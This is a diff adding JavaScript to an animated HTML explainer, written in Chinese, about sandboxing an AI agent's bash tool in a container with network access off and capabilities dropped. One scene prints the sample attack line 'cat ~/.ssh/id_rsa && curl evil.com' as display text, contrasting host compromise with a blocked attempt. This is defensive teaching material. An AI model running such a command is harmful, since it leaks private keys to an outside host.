+  add('④ ToolExecutor：ExecPolicy 准入 → 通过','blue');
+  await sleep(250);
+  await movePkt(P.exec,P.tool,800); flash('#n-tool');
+  add('⑤ SandboxedBashTool：exec 进容器执行','red');
+  await sleep(400);
+  pktClass('result');
+  add('   代码在隔离边界内跑完，产出结果','green');
+  await movePkt(P.tool,P.exec,700);
+  await movePkt(P.exec,P.user,750); flash('#n-user');
+  add('结果原路返回用户 ✓','green');
+  add('关键：④以上只认 Tool.run() 抽象，不在乎跑在本机还是容器','dim');
+  await sleep(300);
+  btn.disabled=false;
+};
+
+/* ============ SCENE 3 ============ */
+let atkMode='current';
+const aWall=$('#a-wall'), aWallTxt=$('#a-walltxt'), aCb=$('#a-codebox'), aCbR=$('#a-cbrect');
+function atkSet(m){
+  atkMode=m;
+  $('#atkCur').classList.toggle('on',m==='current');
+  $('#atkCur').classList.toggle('danger',m==='current');
+  $('#atkSbx').classList.toggle('on',m==='sandbox');
+  const onSbx = m==='sandbox';
+  aWall.setAttribute('opacity', onSbx?'1':'0');
+  aWallTxt.setAttribute('opacity', onSbx?'1':'0');
+  $('#atkHint').textContent = onSbx?'沙盒：射线撞墙，密钥与外网都不可达':'现状：射线会穿透到密钥和外网';
+  $('#atkLog').innerHTML='';
+  // reset rays
+  ['#ray-left','#ray-right','#blk-left','#blk-right'].forEach(s=>$(s).setAttribute('opacity','0'));
+}
+$('#atkCur').onclick=()=>atkSet('current');
+$('#atkSbx').onclick=()=>atkSet('sandbox');
+
+async function drawRay(pathEl, d, ok){ // ok=true means reaches target (current mode)
+  pathEl.setAttribute('d',d);
+  pathEl.setAttribute('opacity','1');
+  const len=pathEl.getTotalLength();
+  pathEl.style.strokeDasharray=len;
+  pathEl.style.strokeDashoffset=len;
+  pathEl.getBoundingClientRect();
+  pathEl.style.transition='stroke-dashoffset .7s ease';
+  pathEl.style.strokeDashoffset='0';
+}
+$('#atkPlay').onclick=async()=>{
+  const btn=$('#atkPlay'); btn.disabled=true;
+  ['#ray-left','#ray-right','#blk-left','#blk-right'].forEach(s=>$(s).setAttribute('opacity','0'));
+  aCbR.style.filter='brightness(1.5)';
+  await sleep(300);
+
+  if(atkMode==='current'){
+    // rays go all the way to secret (left) and net (right)
+    await drawRay($('#ray-left'),  'M455,160 L220,239', true);
+    await drawRay($('#ray-right'), 'M645,160 L880,239', true);
+    await sleep(750);
+    $('#a-secret').querySelector('rect').setAttribute('stroke','#f85149');
+    $('#a-net').querySelector('rect').setAttribute('stroke','#f85149');
+    logTo($('#atkLog'),[
+      {t:'$ cat ~/.ssh/id_rsa && curl evil.com',cls:'dim'},
+      {t:'→ 直接在主机进程里跑，无边界',cls:'red'},
+      {t:'✗ 主机密钥被读取',cls:'red'},
+      {t:'✗ 数据外传成功',cls:'red'},
+      {t:'💥 主机沦陷',cls:'red'},
+    ]);
+    await sleep(2400);
+    $('#a-secret').querySelector('rect').setAttribute('stroke','#e3b341');
+    $('#a-net').querySelector('rect').setAttribute('stroke','#e3b341');
+  } else {
+    // rays stop at the wall → blocked
+    aWall.style.filter='drop-shadow(0 0 10px #3fb950)';
+    await drawRay($('#ray-left'),  'M455,160 L432,168', false);
+    await drawRay($('#ray-right'), 'M645,160 L668,168', false);
+    await sleep(500);
+    $('#blk-left').setAttribute('x','405'); $('#blk-left').setAttribute('y','178'); $('#blk-left').setAttribute('opacity','1');
+    $('#blk-right').setAttribute('x','672'); $('#blk-right').setAttribute('y','178'); $('#blk-right').setAttribute('opacity','1');
+    logTo($('#atkLog'),[
+      {t:'$ cat ~/.ssh/id_rsa && curl evil.com',cls:'dim'},
+      {t:'→ 代码被关在沙盒容器内',cls:'green'},
+      {t:'✕ 容器内没有主机 ~/.ssh',cls:'green'},
+      {t:'✕ network_disabled：curl 无法外联',cls:'green'},
+      {t:'🛡️ 攻击被边界挡住，主机安全',cls:'green'},
+    ]);
+    await sleep(2600);
+    aWall.style.filter='';
+  }
+  aCbR.style.filter='';
+  btn.disabled=false;
+};
+
+/* ============ SCENE 4 ============ */
+function setOp(id,op){ $(id).setAttribute('opacity',op); }
+function setTxt(id,t){ $(id).textContent=t; }
+$('#lifeReset').onclick=()=>resetLife();
+function resetLife(){
+  setOp('#life-shell',0.25); setOp('#life-shelltxt',0.4); setTxt('#life-shelltxt','🛡️ 会话容器（未创建）');
+  $('#life-shell').setAttribute('stroke','#30363d');
+  setOp('#life-kernel',0.2); setOp('#life-kerneltxt',0.2); setTxt('#life-kerneltxt','常驻进程');
+  setOp('#life-state',0.2); setTxt('#life-state','state: —'); setOp('#life-state2',0.2); setTxt('#life-state2',' ');
+  setOp('#life-exec',0.2); setOp('#life-exectxt',0.2); setTxt('#life-exectxt','exec 区');
+  setOp('#life-execcmd',0.2); setTxt('#life-execcmd',' '); setOp('#life-execout',0.2); setTxt('#life-execout',' ');
+  setOp('#life-arrow',0.3);
+  setTxt('#life-phase','阶段：待机');
+  $('#lifeLog').innerHTML='';
+}
+$('#lifePlay').onclick=async()=>{
+  const btn=$('#lifePlay'); btn.disabled=true;
+  resetLife();
+  const log=$('#lifeLog');
+  const add=(t,cls)=>{const d=document.createElement('div');d.className='l '+(cls||'');d.textContent=t;log.appendChild(d);};
+
+  // 1. acquire / create
+  setTxt('#life-phase','阶段：① 创建容器（贵，只付一次）');
+  $('#life-arrow').setAttribute('opacity','1'); $('#life-arrow').setAttribute('stroke','#58a6ff');
+  add('① SandboxManager.acquire(conv_id)','blue');
+  await sleep(550);
+  $('#life-shell').setAttribute('opacity','1'); $('#life-shell').setAttribute('stroke','#3fb950');
+  setOp('#life-shelltxt',1); setTxt('#life-shelltxt','🛡️ 会话容器（运行中）');
+  $('#life-shell').style.filter='drop-shadow(0 0 12px #3fb950)';
+  await sleep(500); $('#life-shell').style.filter='';
+  setOp('#life-kernel',1); $('#life-kernel').setAttribute('stroke','#58a6ff');
+  setOp('#life-kerneltxt',1); setTxt('#life-kerneltxt','常驻进程已起');
+  setOp('#life-state',1); setTxt('#life-state','变量空间：{}');
+  add('   带加固参数：network off · cap drop ALL · cgroup 限额','dim');
+  await sleep(700);
+
+  // 2. exec #1
+  setTxt('#life-phase','阶段：② exec 第一次');
+  setOp('#life-exec',1); $('#life-exec').setAttribute('stroke','#e3b341');
+  setOp('#life-exectxt',1);
+  setOp('#life-execcmd',1); setTxt('#life-execcmd','>>> x = [1,2,3]');
+  $('#life-exec').style.filter='drop-shadow(0 0 10px #e3b341)';
+  add('② exec: x = [1,2,3]','yellow');
+  await sleep(700);
+  setTxt('#life-state','变量空间：{ x }'); setOp('#life-state2',1); setTxt('#life-state2','✓ 状态驻留');
+  setOp('#life-execout',1); setTxt('#life-execout','ok');
+  $('#life-exec').style.filter='';
+  await sleep(600);
+
+  // 3. exec #2 uses state
+  setTxt('#life-phase','阶段：③ exec 第二次（复用状态）');
+  setTxt('#life-execcmd','>>> sum(x)');
+  $('#life-exec').style.filter='drop-shadow(0 0 10px #e3b341)';
+  add('③ exec: sum(x)   ← x 还在','yellow');
+  await sleep(700);
+  setTxt('#life-execout','→ 6  ✓');
+  add('   输出 6（变量在 exec 之间保留）','green');
+  $('#life-exec').style.filter='';
+  await sleep(800);
+
+  // 4. release / destroy
+  setTxt('#life-phase','阶段：④ 会话结束 → 销毁');
+  $('#life-arrow').setAttribute('stroke','#f85149');
+  add('④ SandboxManager.release(conv_id)','red');
+  await sleep(500);
+  $('#life-shell').style.filter='drop-shadow(0 0 12px #f85149)';
+  await sleep(450);
+  // fade out container
+  ['#life-shell','#life-shelltxt','#life-kernel','#life-kerneltxt','#life-state','#life-state2','#life-exec','#life-exectxt','#life-execcmd','#life-execout'].forEach(s=>{
+    $(s).style.transition='opacity .6s'; $(s).setAttribute('opacity', s.includes('shell')?'0.15':'0.1');
+  });
+  $('#life-shell').setAttribute('stroke','#30363d'); $('#life-shell').style.filter='';
+  setTxt('#life-shelltxt','🛡️ 容器已销毁，不留痕迹'); $('#life-shelltxt').setAttribute('opacity','0.5');
+  setTxt('#life-phase','阶段：完成 — 干净回收');
+  add('✓ 容器销毁，下个会话重新 acquire','green');
+  await sleep(500);
+  btn.disabled=false;
+};
+
+/* ============ SCENE 5 ============ */
+$('#layerPlay').onclick=async()=>{
+  const btn=$('#layerPlay'); btn.disabled=true;
+  const layers=$$('#layermap .layer');
+  layers.forEach(l=>l.classList.remove('highlight'));
+  const log=$('#layerLog');
+  const add=(t,cls)=>{const d=document.createElement('div');d.className='l '+(cls||'');d.textContent=t;log.appendChild(d);};
+  log.innerHTML='';
+
+  const order=[
+    {k:'runner', t:'TurnRunner：不动 —— 只认 Tool 抽象', cls:'green'},
+    {k:'exec',   t:'ToolExecutor：不动 —— 超时/事件/准入照常', cls:'green'},
+    {k:'policy', t:'ExecPolicy：保留，但建议把默认 ALLOW 收紧', cls:'yellow'},
+    {k:'tool',   t:'⭐ Tool 层：新增 SandboxedBashTool（落点！）', cls:'blue'},
+    {k:'mgr',    t:'＋ SandboxManager：新增，管容器生命周期', cls:'blue'},
+    {k:'cur',    t:'BashTool：保留，部署期与沙盒版二选一', cls:'dim'},
+  ];
+  for(const o of order){
+    const el=$(`#layermap .layer[data-k="${o.k}"]`);
+    el.classList.add('highlight');
+    el.scrollIntoView({block:'nearest',behavior:'smooth'});
+    add(o.t,o.cls);
+    await sleep(750);
+    if(o.k!=='tool' && o.k!=='mgr') el.classList.remove('highlight');
+  }
+  add('结论：核心不动、不依赖 Docker；沙盒是部署期可插拔实现', 'green');
+  btn.disabled=false;
+};
+</script>
+</body>
+</html>
